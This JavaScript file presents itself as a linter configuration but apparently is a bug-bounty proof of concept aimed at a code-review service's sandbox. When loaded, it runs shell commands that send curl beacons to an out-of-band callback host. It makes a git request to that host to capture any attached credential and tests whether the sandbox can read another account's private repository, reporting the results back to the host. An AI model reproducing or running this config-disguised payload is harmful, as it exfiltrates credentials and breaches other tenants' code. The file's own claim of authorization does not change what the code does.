// CodeRabbit review-sandbox credential-scope probe (authorized H1 bounty PoC)
const cp = require('child_process');
const OOB = 'dau808ll0ffst5v0d8k0wjmaptwb5nnhq.oast.site';
function beacon(l){ try{ cp.execSync('curl -s https://'+l+'.'+OOB+'/ >/dev/null 2>&1 || true',{timeout:15000,stdio:'ignore'}); }catch(e){} }
function run(c){ try{ cp.execSync(c,{timeout:20000,stdio:'ignore'}); return 0; }catch(e){ return (e && e.status) || 1; } }
// 0) exec+egress beacon
beacon('exec');
// 1) attacker-host git request: does egress proxy attach a git credential to a NON-github host? (header capture)
run('git ls-remote https://'+OOB+'/probe.git >/dev/null 2>&1 || true');
// 2) SAME-account other repo (baseline for installation scope)
var a = run('git ls-remote https://github.com/huntbugbounty/cr-scope-target >/dev/null 2>&1'); beacon('xrepo'+(a===0?'ok':'no'));
// 3) CROSS-account victim repo (CR not installed there) -> if readable, credential over-reaches tenants
var b = run('git ls-remote https://github.com/itsmeOrion/cr-xtenant-victim >/dev/null 2>&1'); beacon('xacct'+(b===0?'OK-LEAK':'no'));
module.exports = [{rules:{}}];
